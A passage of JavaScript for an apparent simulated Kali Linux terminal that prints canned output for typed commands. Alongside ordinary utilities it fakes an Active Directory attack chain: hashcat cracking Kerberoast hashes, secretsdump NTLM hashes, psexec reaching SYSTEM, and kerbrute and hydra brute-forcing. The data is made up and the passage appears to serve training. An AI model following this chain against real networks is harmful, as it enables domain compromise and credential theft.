      { t: 'ATTENTION! Pure (unoptimized) backend kernels selected.', cls: 'y' },
      { t: '' },
      { t: '$krb5tgs$23$*svc_backup$...:Backup2023!', cls: 'g' },
      { t: '$krb5tgs$23$*svc_sql$...:SqlServer1!', cls: 'g' },
      { t: '$krb5tgs$23$*svc_web$...:Welcome123', cls: 'g' },
      { t: '' },
      { t: 'Session..........: hashcat' },
      { t: 'Status...........: Cracked', cls: 'g' },
      { t: 'Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)' },
      { t: 'Time.Started.....: Mon Jan 15 14:18:04 2024 (22 secs)' },
      { t: 'Speed.#1.........:  3,482.2 kH/s (1.48ms) @ Accel:512 Loops:1 Thr:32 Vec:4' },
      { t: 'Recovered........: 3/3 (100.00%) Digests (total), 3/3 (100.00%) Digests (new)' },
      { t: 'Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)' },
      { t: '' },
      { t: 'Started: Mon Jan 15 14:18:04 2024', cls: 'd' },
      { t: 'Stopped: Mon Jan 15 14:18:26 2024', cls: 'd' },
    ],
  },

  // ── secretsdump ───────────────────────────────────────────────────────────
  {
    id: 'secretsdump',
    loadTime: () => jitter(3500, 900),
    match: c => /impacket-secretsdump|secretsdump/.test(c) && c.includes('10.10.10.10'),
    lines: [
      { t: 'Impacket v0.11.0 - Copyright 2023 Fortra' },
      { t: '' },
      { t: '[*] Target system bootKey: 0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d', cls: 'b' },
      { t: '[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)', cls: 'b' },
      { t: 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::', cls: 'g' },
      { t: 'Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::' },
      { t: '' },
      { t: '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)', cls: 'b' },
      { t: '[*] Using the DRSUAPI method to get NTDS.DIT secrets', cls: 'b' },
      { t: 'CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::', cls: 'g' },
      { t: 'CORP\\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::' },
      { t: 'CORP\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9f3a8b2c1d4e5f6a7b8c9d0e1f2a3b4c:::' },
      { t: 'CORP\\john.doe:1103:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::' },
      { t: 'CORP\\svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5:::', cls: 'g' },
      { t: 'CORP\\svc_sql:1105:aad3b435b51404eeaad3b435b51404ee:f4c5e53a5e66f1c6e1c6d57f6eac2f5a:::' },
      { t: 'CORP\\svc_web:1106:aad3b435b51404eeaad3b435b51404ee:e10adc3949ba59abbe56e057f20f883e:::' },
      { t: '' },
      { t: '[*] Kerberos keys grabbed', cls: 'b' },
      { t: 'CORP\\Administrator:aes256-cts-hmac-sha1-96:3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4' },
      { t: '' },
      { t: '[*] Cleaning up...', cls: 'd' },
    ],
  },

  // ── psexec ────────────────────────────────────────────────────────────────
  {
    id: 'psexec',
    loadTime: () => jitter(5000, 1200),
    match: c => /impacket-psexec|psexec\.py/.test(c) && c.includes('10.10.10.10'),
    lines: [
      { t: 'Impacket v0.11.0 - Copyright 2023 Fortra' },
      { t: '' },
      { t: '[*] Requesting shares on 10.10.10.10.....', cls: 'b' },
      { t: '[*] Found writable share ADMIN$', cls: 'g' },
      { t: '[*] Uploading file XGaHpFZv.exe', cls: 'b' },
      { t: '[*] Opening SVCManager on 10.10.10.10.....', cls: 'b' },
      { t: '[*] Creating service oUUL on 10.10.10.10.....', cls: 'b' },
      { t: '[*] Starting service oUUL.....', cls: 'b' },
      { t: '[!] Press help for extra shell commands', cls: 'y' },
      { t: 'Microsoft Windows [Version 10.0.17763.4737]', cls: 'w' },
      { t: '(c) 2018 Microsoft Corporation. All rights reserved.', cls: 'd' },
      { t: '' },
      { t: 'C:\\Windows\\system32> whoami', cls: 'p' },
      { t: 'nt authority\\system', cls: 'g' },
      { t: '' },
      { t: 'C:\\Windows\\system32> ', cls: 'p' },
    ],
    after: () => { SIM.windowsShell = true; },
  },

  // ── gobuster / dirb ───────────────────────────────────────────────────────
  {
    loadTime: () => jitter(3000, 800),
    match: c => /^gobuster\b|^dirb\b|^dirsearch\b/.test(c),
    lines: [
      { t: 'Gobuster v3.6', cls: 'b' },
      { t: 'by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)', cls: 'd' },
      { t: '' },
      { t: 'Initializing scan...' },
      { t: '/index.html           (Status: 200) [Size: 1245]', cls: 'g' },
      { t: '/images               (Status: 301) [Size: 166]', cls: 'g' },
      { t: '/admin                (Status: 403) [Size: 291]', cls: 'y' },
      { t: '' },
      { t: 'Finished', cls: 'g' },
    ],
  },

  // ── rpcclient ─────────────────────────────────────────────────────────────
  {
    loadTime: () => jitter(1100, 300),
    match: c => /^rpcclient\b/.test(c),
    lines: [
      { t: 'rpcclient $> enumdomusers', cls: 'd' },
      { t: 'user:[Administrator] rid:[0x1f4]' },
      { t: 'user:[john.doe] rid:[0x44f]' },
      { t: 'user:[svc_backup] rid:[0x450]' },
      { t: 'user:[svc_sql] rid:[0x451]' },
      { t: 'user:[svc_web] rid:[0x452]' },
      { t: 'rpcclient $> quit', cls: 'd' },
    ],
  },

  // ── smbclient ─────────────────────────────────────────────────────────────
  {
    loadTime: () => jitter(1200, 350),
    match: c => /^smbclient\b/.test(c),
    lines: [
      { t: 'Password for [WORKGROUP\\root]:' },
      { t: '' },
      { t: '\tSharename       Type      Comment' },
      { t: '\t---------       ----      -------' },
      { t: '\tSYSVOL          Disk      Logon server share', cls: 'b' },
      { t: '\tNETLOGON        Disk      Logon server share', cls: 'b' },
      { t: '\tIPC$            IPC       Remote IPC', cls: 'd' },
      { t: 'Reconnecting with SMB1 for workgroup listing.' },
    ],
  },

  // ── kerbrute ─────────────────────────────────────────────────────────────
  {
    loadTime: () => jitter(3000, 800),
    match: c => /^kerbrute\b/.test(c),
    lines: [
      { t: '    __             __               __', cls: 'p' },
      { t: '   / /_____  _____/ /_  _______  __/ /____', cls: 'p' },
      { t: '  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\', cls: 'p' },
      { t: ' / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/', cls: 'p' },
      { t: '/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/', cls: 'p' },
      { t: '' },
      { t: 'Version: v1.0.3 (9dad6e1) - 01/15/24 - Ronnie Flathers @ropnop', cls: 'd' },
      { t: '' },
      { t: '2024/01/15 14:05:31 >  Using KDC(s):', cls: 'b' },
      { t: '2024/01/15 14:05:31 >  10.10.10.10:88', cls: 'b' },
      { t: '' },
      { t: '2024/01/15 14:05:32 >  [+] VALID USERNAME: Administrator@CORP.LOCAL', cls: 'g' },
      { t: '2024/01/15 14:05:32 >  [+] VALID USERNAME: john.doe@CORP.LOCAL', cls: 'g' },
      { t: '2024/01/15 14:05:32 >  [+] VALID USERNAME: svc_backup@CORP.LOCAL', cls: 'g' },
      { t: '2024/01/15 14:05:33 >  Done! Tested 100 usernames, 3 valid', cls: 'g' },
    ],
  },

  // ── hydra ─────────────────────────────────────────────────────────────────
  {
    loadTime: () => jitter(3500, 800),
    match: c => /^hydra\b/.test(c),
    lines: [
      { t: 'Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak' },
      { t: '' },
      { t: 'Hydra (https://github.com/vanhauser-thc/thc-hydra) starting...', cls: 'b' },
      { t: '[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries' },
      { t: '[DATA] attacking smb://10.10.10.10:445/' },
      { t: '[445][smb] host: 10.10.10.10   login: john.doe   password: Password1!', cls: 'g' },
      { t: '1 of 1 target successfully completed, 1 valid password found', cls: 'g' },
    ],
  },

  // ── ps ────────────────────────────────────────────────────────────────────
  {
    match: c => /^ps(\s|$)/.test(c),
    loadTime: () => jitter(300, 80),
    lines: [{ t: c => {
      const isAux = c.includes('aux') || c.includes('-aux') || c.includes('a');
      if (isAux) return [
        'USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND',
        'root           1  0.0  0.2 168796 13132 ?        Ss   12:09   0:02 /sbin/init',
        'root           2  0.0  0.0      0     0 ?        S    12:09   0:00 [kthreadd]',
        'root         432  0.7  0.3 545928 24568 ?        Ssl  12:09   0:03 /usr/sbin/NetworkManager --no-daemon',
        'root         591  0.0  0.1  12312  7712 ?        Ss   12:09   0:00 sshd: /usr/sbin/sshd -D',
        'root         623  0.0  0.0  11688  3560 ?        Ss   12:09   0:00 /usr/sbin/cron -f',
        'kali         891  0.0  0.6 231420 52400 tty7     Ss+  12:10   0:01 /usr/bin/Xorg :0 -seat seat0',
        'kali        1189  0.0  0.9 456748 78432 ?        Ss   12:10   0:02 xfce4-session',
        `${SIM.user.padEnd(12)} 1234  0.0  0.1  11936  5192 pts/0    Ss   12:10   0:00 bash`,
        `${SIM.user.padEnd(12)} 1338  0.0  0.0  12240  3512 pts/0    R+   14:23   0:00 ps aux`,
      ].join('\n');
      return [
        '    PID TTY          TIME CMD',
        `   1234 pts/0    00:00:00 bash`,
        `   1338 pts/0    00:00:00 ps`,
      ].join('\n');
    }}],
  },

  // ── ss / netstat ─────────────────────────────────────────────────────────
  {
    match: c => /^(ss|netstat)(\s|$)/.test(c),
    loadTime: () => jitter(250, 60),
    lines: [
      { t: 'Netid  State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port' },
      { t: 'tcp    LISTEN  0       128     0.0.0.0:22         0.0.0.0:*', cls: 'g' },
      { t: 'tcp    LISTEN  0       128     127.0.0.1:631      0.0.0.0:*' },
      { t: 'tcp    ESTAB   0       0       10.10.10.5:51234   10.10.10.10:445', cls: 'b' },
    ],
  },

  // ── sudo -l (called by _runSudoCmd after auth) ────────────────────────────
  {
    match: c => c === '-l',
    lines: [
      { t: 'Matching Defaults entries for kali on kali:' },
      { t: '    env_reset, mail_badpass,' },
      { t: '    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' },
      { t: '' },
      { t: 'User kali may run the following commands on kali:', cls: 'g' },
      { t: '    (ALL : ALL) ALL', cls: 'g' },
    ],
  },

  // ── which ────────────────────────────────────────────────────────────────
  {
    match: c => /^which\s/.test(c),
    lines: [{ t: (c) => {
      const tool = c.replace(/^which\s+/, '').trim();
      const paths = {
        nmap: '/usr/bin/nmap', python3: '/usr/bin/python3', python: '/usr/bin/python3',
        bash: '/usr/bin/bash', sh: '/usr/bin/sh', john: '/usr/sbin/john',
        hashcat: '/usr/bin/hashcat', curl: '/usr/bin/curl', wget: '/usr/bin/wget',
        ssh: '/usr/bin/ssh', nc: '/usr/bin/nc', netcat: '/usr/bin/nc',
        'impacket-GetUserSPNs': '/usr/bin/impacket-GetUserSPNs',
        'impacket-secretsdump': '/usr/bin/impacket-secretsdump',
        'impacket-psexec': '/usr/bin/impacket-psexec',
        crackmapexec: '/usr/bin/crackmapexec', enum4linux: '/usr/bin/enum4linux',
        hydra: '/usr/bin/hydra', gobuster: '/usr/bin/gobuster',
        kerbrute: '/opt/kerbrute/kerbrute',
        top: '/usr/bin/top', htop: '/usr/bin/htop',
        df: '/usr/bin/df', free: '/usr/bin/free',
        ifconfig: '/usr/sbin/ifconfig', ip: '/usr/sbin/ip',
        ps: '/usr/bin/ps', ss: '/usr/bin/ss', arp: '/usr/sbin/arp',
      };
      return paths[tool] || `${tool} not found`;
    }, cls: (c) => {
      const tool = c.replace(/^which\s+/, '').trim();
      return ['nmap','john','hashcat','curl','wget','ssh','python3','bash','crackmapexec','enum4linux'].includes(tool) ? 'g' : 'r';
    }}],
  },

  // ── find ─────────────────────────────────────────────────────────────────
  {
    match: c => /^find\s/.test(c),
    loadTime: () => jitter(500, 150),
    lines: [{ t: (c) => {
      if (c.includes('.kerberoast') || c.includes('hash')) return SIM.hashesOnDisk ? '/home/kali/hashes.kerberoast' : '';
      if (c.includes('wordlist') || c.includes('rockyou')) return '/usr/share/wordlists/rockyou.txt';
      if (c.includes('txt')) return '/home/kali/notes.txt\n/etc/hosts\n/etc/os-release';
      return '';
    }}],
  },

  // ── grep ─────────────────────────────────────────────────────────────────
  {
    match: c => /^grep\s/.test(c),
    loadTime: () => jitter(180, 60),
    lines: [{ t: (c) => {
      if (c.includes('root') && c.includes('passwd')) return 'root:x:0:0:root:/root:/bin/bash';
      if (c.includes('kali') && c.includes('passwd')) return 'kali:x:1000:1000:Kali,,,:/home/kali:/bin/bash';
      if (c.includes('svc') || c.includes('service')) return 'svc_backup:Backup2023!\nsvc_sql:SqlServer1!\nsvc_web:Welcome123';
      return '';
    }, cls: 'g'}],
  },

  // ── python3 ───────────────────────────────────────────────────────────────
  {
    match: c => /^python3?(\s|$)/.test(c),
    lines: [{ t: (c) => {
      if (c.includes('--version') || c.includes('-V')) return 'Python 3.11.6';
      if (c.includes('-c')) return '';
      return 'Python 3.11.6 (main, Oct 2 2023, 20:46:14) [GCC 13.2.0] on linux\nType "help", "copyright", "credits" or "license" for more information.\n>>> (simulation — interactive mode not supported)';
    }}],
  },

  // ── curl / wget ───────────────────────────────────────────────────────────
  {
    match: c => /^curl\s/.test(c),
    loadTime: () => jitter(900, 300),
    lines: [{ t: (c) => {
      if (c.includes('10.10.10.10') || c.includes('dc01')) return '<!DOCTYPE html>\n<html><head><title>IIS Windows Server</title></head><body><h1>IIS</h1></body></html>';
      return 'curl: (6) Could not resolve host: ' + c.split(' ').pop();
    }}],
  },
  {
    match: c => /^wget\s/.test(c),
    loadTime: () => jitter(1400, 400),
    lines: [
      { t: (c) => `--2024-01-15 14:23:01--  ${c.split(' ').pop()}` },
      { t: 'Connecting to... connected.' },
      { t: 'HTTP request sent, awaiting response... 200 OK' },
      { t: 'Length: 4096 (4.0K)' },
      { t: 'Saving to: output_file' },
      { t: '2024-01-15 14:23:02 (4.00 MB/s) — output_file saved [4096/4096]', cls: 'g' },
    ],
  },

  // ── ssh ───────────────────────────────────────────────────────────────────
  {
    match: c => /^ssh\s/.test(c),
    loadTime: () => jitter(2200, 600),
    lines: [
      { t: (c) => {
        const host = c.split(' ').pop();
        return `ssh: connect to host ${host} port 22: Connection refused`;
      }, cls: 'r' },
    ],
  },

  // ── nc / netcat ───────────────────────────────────────────────────────────
  {
    match: c => /^(nc|netcat)\s/.test(c),
    loadTime: () => jitter(1500, 400),
    lines: [{ t: '(simulation — nc not interactive)', cls: 'd' }],
  },

  // ── nano / vim / vi ───────────────────────────────────────────────────────
  {
    match: c => /^(nano|vim?|gedit|emacs|micro)\b/.test(c),
    lines: [{ t: (c) => `${c.split(' ')[0]}: interactive editors not supported in this simulation`, cls: 'y' }],
  },

  // ── service / systemctl ───────────────────────────────────────────────────
  {
    match: c => /^(service|systemctl)\s/.test(c),
    loadTime: () => jitter(500, 150),
    lines: [{ t: (c) => {
      if (c.includes('status')) return '● ssh.service - OpenBSD Secure Shell server\n   Loaded: loaded (/lib/systemd/system/ssh.service)\n   Active: active (running) since Mon 2024-01-15 12:10:03 EST; 2h 13min ago\n Main PID: 591 (sshd)\n   CGroup: /system.slice/ssh.service\n           └─591 sshd: /usr/sbin/sshd -D';
      if (c.includes('start') || c.includes('restart')) return '';
      return '';
    }}],
  },

  // ── top (animated live display) ──────────────────────────────────────────
  {
    match: c => c === 'top' || /^top\s/.test(c),
    liveDisplay: true,
    loadTime: 120000,
    refreshMs: 2000,
    displayFn: (tick) => {
      const now = new Date(Date.now() + tick * 2000);
      const hms = `${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}`;
      const upM = String(13 + Math.floor(tick * 2 / 60)).padStart(2, '0');
      const upS = String((tick * 2) % 60).padStart(2, '0');
      const r = (v, d) => Math.max(0, v + (Math.random() * d * 2 - d));
      const us = r(8.4, 2.5).toFixed(1);
      const sy = r(3.1, 0.8).toFixed(1);
      const wa = r(0.4, 0.3).toFixed(1);
      const id = Math.max(0, 100 - parseFloat(us) - parseFloat(sy) - parseFloat(wa)).toFixed(1);
      const memFree = r(3821.5, 40).toFixed(1);
      const memUsed = r(3254.3, 30).toFixed(1);
      const la1  = r(0.72, 0.15).toFixed(2);
      const la5  = r(0.58, 0.10).toFixed(2);
      const la15 = r(0.41, 0.08).toFixed(2);
      const nmT = `0:0${3 + Math.floor(tick / 30)}.${String((21 + tick) % 100).padStart(2,'0')}`;
      const baT = `0:0${Math.floor((44 + tick * 3) / 100)}.${String((44 + tick * 3) % 100).padStart(2,'0')}`;
      const toT = `0:00.${String(tick % 100).padStart(2,'0')}`;
      return [
        { t: `top - ${hms} up  2:${upM}:${upS},  1 user,  load average: ${la1}, ${la5}, ${la15}` },
        { t: `Tasks: \x1b[97m142\x1b[0m total,   \x1b[32m1\x1b[0m running, \x1b[0m141\x1b[0m sleeping,   0 stopped,   0 zombie` },
        { t: `%Cpu(s): \x1b[32m${String(us).padStart(4)} us\x1b[0m, \x1b[31m${String(sy).padStart(4)} sy\x1b[0m,  0.0 ni, \x1b[90m${String(id).padStart(5)} id\x1b[0m,  ${wa} wa,  0.0 hi,  0.0 si,  0.0 st` },
        { t: `\x1b[94mMiB Mem\x1b[0m :   8192.0 total,  ${String(memFree).padStart(7)} free,  \x1b[33m${String(memUsed).padStart(7)} used\x1b[0m,   ${(8192 - parseFloat(memFree) - parseFloat(memUsed)).toFixed(1)} buff/cache` },
        { t: `\x1b[94mMiB Swap\x1b[0m:   2048.0 total,   2048.0 free,      0.0 used.   ${(8192 - parseFloat(memUsed)).toFixed(1)} avail Mem` },
        { t: '' },
        { t: `\x1b[7m    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                              \x1b[0m` },
        { t: `    432 root      20   0  545928  24568  18844 S  \x1b[33m${String(us).padStart(4)}\x1b[0m   0.3   ${nmT} NetworkManager` },
        { t: `   1234 ${SIM.user.padEnd(9)} 20   0   11936   5192   3824 S  \x1b[32m${r(2.1,0.8).toFixed(1).padStart(4)}\x1b[0m   0.1   ${baT} bash` },
        { t: `      1 root      20   0  168796  13132   8392 S   0.0   0.2   0:02.14 systemd` },
        { t: `      2 root      20   0       0      0      0 S   0.0   0.0   0:00.01 [kthreadd]` },
        { t: `      3 root      20   0       0      0      0 I   0.0   0.0   0:00.00 [rcu_gp]` },
        { t: `    591 root      20   0   12312   7712   6448 S   0.0   0.1   0:00.08 sshd` },
        { t: `    623 root      20   0   11688   3560   3284 S   0.0   0.0   0:00.01 cron` },
        { t: `    891 kali      20   0  231420  52400  38100 S   0.0   0.6   0:01.23 Xorg` },
        { t: `   1189 kali      20   0  456748  78432  59200 S   0.0   0.9   0:02.11 xfce4-session` },
        { t: `   1337 ${SIM.user.padEnd(9)} 20   0   14240   3864   3188 R   0.0   0.0   ${toT} \x1b[1;97mtop\x1b[0m` },
        { t: '' },
        { t: `\x1b[90mq or Ctrl+C to quit\x1b[0m` },
      ];
    },
    // dead code path kept to satisfy dispatcher shape
    lines: [{ t: '' }],
  },

  // ── htop (animated, colored) ──────────────────────────────────────────────
  {
    match: c => c === 'htop' || /^htop\s/.test(c),
    liveDisplay: true,
    loadTime: 120000,
    refreshMs: 2000,
    displayFn: (tick) => {
      const r  = (v, d) => Math.max(0, v + (Math.random() * d * 2 - d));
      const cpuPct  = r(11.5, 3.0);
      const memUsedM = Math.round(r(3254, 40));
      const la1  = r(0.72, 0.15).toFixed(2);
      const la5  = r(0.58, 0.10).toFixed(2);
      const la15 = r(0.41, 0.08).toFixed(2);
      const upM  = String(13 + Math.floor(tick * 2 / 60)).padStart(2,'0');
      const upS  = String((tick * 2) % 60).padStart(2,'0');
      const toT  = `0:00.${String(tick % 100).padStart(2,'0')}`;

      // CPU bar — green=user, red=sys, blank=idle
      const W = 36;
      const fill  = Math.round(cpuPct / 100 * W);
      const uFill = Math.max(1, Math.round(fill * 0.75));
      const sFill = fill - uFill;
      const cpuBar = `\x1b[32m${'|'.repeat(uFill)}\x1b[31m${'|'.repeat(sFill)}\x1b[0m${' '.repeat(W - fill)}`;

      // Memory bar — green=used, blue=buffers
      const mFill  = Math.round(memUsedM / 8192 * W);
      const mU     = Math.max(1, Math.round(mFill * 0.88));
      const mB     = mFill - mU;
      const memBar = `\x1b[32m${'|'.repeat(mU)}\x1b[34m${'|'.repeat(mB)}\x1b[0m${' '.repeat(W - mFill)}`;

      return [
        { t: `  \x1b[32mCPU\x1b[0m[${cpuBar}] ${String(cpuPct.toFixed(1)).padStart(5)}%   Tasks: \x1b[32m142\x1b[0m, 456 thr; \x1b[32m1\x1b[0m running` },
        { t: `  \x1b[32mMem\x1b[0m[${memBar}] ${memUsedM}M/8192M   Load avg: \x1b[33m${la1} ${la5} ${la15}\x1b[0m` },
        { t: `  \x1b[32mSwp\x1b[0m[${' '.repeat(W)}]    0K/2048M   Uptime: \x1b[97m02:${upM}:${upS}\x1b[0m` },
        { t: '' },
        { t: `\x1b[1;30;47m  PID USER       PRI  NI  VIRT   RES   SHR S CPU%  MEM%   TIME+   Command                              \x1b[0m` },
        { t: `  432 \x1b[32mroot\x1b[0m        20   0  533M 24568 18844 S ${String(cpuPct.toFixed(1)).padStart(5)}  0.3  0:03.21 \x1b[32mNetworkManager\x1b[0m` },
        { t: ` 1234 \x1b[32m${SIM.user.padEnd(10)}\x1b[0m 20   0 11936  5192  3824 S  ${r(2.1,0.8).toFixed(1).padStart(4)}   0.1  ${`0:0${Math.floor((44 + tick * 3)/100)}.${String((44 + tick * 3) % 100).padStart(2,'0')}`} \x1b[32mbash\x1b[0m` },
        { t: `    1 \x1b[32mroot\x1b[0m        20   0  165M 13132  8392 S  0.0   0.2  0:02.14 \x1b[90m/sbin/init\x1b[0m` },
        { t: `    2 \x1b[32mroot\x1b[0m         0 -20     0     0     0 I  0.0   0.0  0:00.01 \x1b[90m[kthreadd]\x1b[0m` },
        { t: `  591 \x1b[32mroot\x1b[0m        20   0 12312  7712  6448 S  0.0   0.1  0:00.08 \x1b[36msshd\x1b[0m` },
        { t: `  623 \x1b[32mroot\x1b[0m        20   0 11688  3560  3284 S  0.0   0.0  0:00.01 \x1b[36mcron\x1b[0m` },
        { t: `  891 \x1b[34mkali\x1b[0m        20   0  226M 52400 38100 S  0.0   0.6  0:01.23 \x1b[34mXorg\x1b[0m` },
        { t: ` 1189 \x1b[34mkali\x1b[0m        20   0  446M 78432 59200 S  0.0   0.9  0:02.11 \x1b[34mxfce4-session\x1b[0m` },
        { t: ` 1338 \x1b[34m${SIM.user.padEnd(10)}\x1b[0m 20   0 14240  3864  3188 R  0.0   0.0  ${toT}  \x1b[1;97mhtop\x1b[0m` },
        { t: '' },
        { t: `\x1b[30;42m F1\x1b[0mHelp \x1b[30;42m F2\x1b[0mSetup \x1b[30;42m F3\x1b[0mSearch \x1b[30;42m F4\x1b[0mFilter \x1b[30;42m F5\x1b[0mTree \x1b[30;42m F6\x1b[0mSortBy \x1b[30;42m F9\x1b[0mKill \x1b[30;42mF10\x1b[0mQuit` },
      ];
    },
    lines: [{ t: '' }],
  },

  // ── df ────────────────────────────────────────────────────────────────────
  {
    match: c => /^df(\s|$)/.test(c),
    lines: [
      { t: 'Filesystem      Size  Used Avail Use% Mounted on' },
      { t: '/dev/sda1        50G   18G   30G  38% /', cls: 'g' },
      { t: 'tmpfs           4.0G     0  4.0G   0% /dev/shm' },
      { t: 'tmpfs           1.6G  1.2M  1.6G   1% /run' },
      { t: '/dev/sda2       200G   45G  145G  24% /home', cls: 'g' },
      { t: 'tmpfs           100M   20K  100M   1% /run/user/1000' },
    ],
  },

  // ── free ─────────────────────────────────────────────────────────────────
  {
    match: c => /^free(\s|$)/.test(c),
    lines: [
      { t: '               total        used        free      shared  buff/cache   available' },
      { t: 'Mem:         8388608     2914048     4325632       13312     1148928     5178208', cls: 'b' },
      { t: 'Swap:        2097152           0     2097152', cls: 'd' },
    ],
  },

  // ── ifconfig / ip addr / ip a ─────────────────────────────────────────────
  {
    match: c => c === 'ifconfig' || c === 'ifconfig -a' || /^ip\s+(addr|a|address|link)/.test(c),
    lines: [
      { t: 'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500', cls: 'b' },
      { t: '        inet 10.10.10.5  netmask 255.255.255.0  broadcast 10.10.10.255' },
      { t: '        inet6 fe80::250:56ff:fe8d:4ab3  prefixlen 64  scopeid 0x20<link>' },
      { t: '        ether 00:50:56:8d:4a:b3  txqueuelen 1000  (Ethernet)' },
      { t: '        RX packets 84231  bytes 12445920 (11.8 MiB)' },
      { t: '        TX packets 52134  bytes 8923410 (8.5 MiB)' },
      { t: '' },
      { t: 'lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536', cls: 'b' },
      { t: '        inet 127.0.0.1  netmask 255.0.0.0' },
      { t: '        inet6 ::1  prefixlen 128  scopeid 0x10<host>' },
      { t: '        loop  txqueuelen 1000  (Local Loopback)' },
    ],
  },

  // ── ip route ─────────────────────────────────────────────────────────────
  {
    match: c => /^ip\s+r(oute)?/.test(c) || c === 'route -n' || c === 'route',
    lines: [
      { t: 'default via 10.10.10.1 dev eth0 proto dhcp metric 100', cls: 'g' },
      { t: '10.10.10.0/24 dev eth0 proto kernel scope link src 10.10.10.5 metric 100' },
      { t: '127.0.0.0/8 dev lo proto kernel scope link src 127.0.0.1' },
    ],
  },

  // ── arp ───────────────────────────────────────────────────────────────────
  {
    match: c => /^arp(\s|$)/.test(c),
    lines: [
      { t: 'Address                  HWtype  HWaddress           Flags Mask    Iface' },
      { t: '10.10.10.1               ether   00:50:56:c0:00:08   C             eth0' },
      { t: '10.10.10.10              ether   00:0c:29:3a:bc:de   C             eth0', cls: 'g' },
    ],
  },

  // ── echo ─────────────────────────────────────────────────────────────────
  {
    match: c => /^echo(\s|$)/.test(c),
    lines: [{ t: c => c.replace(/^echo\s*/, '').replace(/^(['"])(.*)\1$/, '$2') }],
  },

  // ── lsb_release ──────────────────────────────────────────────────────────
  {
    match: c => /^lsb_release/.test(c),
    lines: [
      { t: 'Distributor ID:\tKali' },
      { t: 'Description:\tKali GNU/Linux Rolling' },
      { t: 'Release:\t2024.2' },
      { t: 'Codename:\tkali-rolling' },
    ],
  },

  // ── w / who ──────────────────────────────────────────────────────────────
  {
    match: c => c === 'w' || c === 'who' || c === 'who -a',
    lines: [{ t: () => {
      const t = new Date();
      const hms = `${String(t.getHours()).padStart(2,'0')}:${String(t.getMinutes()).padStart(2,'0')}:${String(t.getSeconds()).padStart(2,'0')}`;
      return ` ${hms} up 2:13,  1 user,  load average: 0.15, 0.22, 0.18\nUSER     TTY      FROM             LOGIN@   IDLE JCPU   PCPU WHAT\n${SIM.user}     pts/0    10.10.10.1       12:10    0.00s  0.08s  0.00s w`;
    }}],
  },

  // ── last ─────────────────────────────────────────────────────────────────
  {
    match: c => /^last(\s|$)/.test(c),
    lines: [
      { t: () => `${SIM.user.padEnd(8)} pts/0        10.10.10.1       Mon Jan 15 12:10   still logged in` },
      { t: 'reboot   system boot  6.6.9-amd64      Mon Jan 15 12:09   still running' },
      { t: '' },
      { t: 'wtmp begins Mon Jan 15 12:09:02 2024', cls: 'd' },
    ],
  },

  // ── mkdir / touch / rm / cp / mv ─────────────────────────────────────────
  {
    match: c => /^(mkdir|touch|rm|cp|mv)\s/.test(c),
    lines: [{ t: c => {
      const op = c.split(' ')[0];
      if (op === 'rm' && c.includes('-rf') && (c.includes('/') && c.split(' ').pop() === '/'))
        return 'rm: it is dangerous to operate recursively on \'/\'';
      return '';   // silent success
    }}],
  },

  // ── cat /proc entries ─────────────────────────────────────────────────────
  {
    match: c => c === 'cat /proc/version',
    lines: [{ t: 'Linux version 6.6.9-amd64 (debian-kernel@lists.debian.org) (gcc-13 (Debian 13.2.0-13) 13.2.0, GNU ld (GNU Binutils for Debian) 2.41) #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08)' }],
  },
  {
    match: c => c === 'cat /proc/cpuinfo' || c === 'cat /proc/cpuinfo | head -20',
    lines: [
      { t: 'processor\t: 0' },
      { t: 'vendor_id\t: GenuineIntel' },
      { t: 'cpu family\t: 6' },
      { t: 'model name\t: Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz' },
      { t: 'cpu MHz\t\t: 3799.998' },
      { t: 'cache size\t: 16384 KB' },
      { t: 'physical id\t: 0' },
      { t: 'cpu cores\t: 4' },
      { t: 'flags\t\t: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht syscall nx rdtscp lm constant_tsc' },
    ],
  },

  // ── lscpu ────────────────────────────────────────────────────────────────
  {
    match: c => c === 'lscpu' || /^lscpu\s/.test(c),
    lines: [
      { t: 'Architecture:                    x86_64', cls: 'b' },
      { t: 'CPU op-mode(s):                  32-bit, 64-bit' },
      { t: 'Address sizes:                   45 bits physical, 48 bits virtual' },
      { t: 'Byte Order:                      Little Endian' },
      { t: 'CPU(s):                          4', cls: 'g' },
      { t: 'On-line CPU(s) list:             0-3' },
      { t: 'Vendor ID:                       GenuineIntel' },
      { t: 'BIOS Vendor ID:                  GenuineIntel' },
      { t: 'Model name:                      Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz', cls: 'g' },
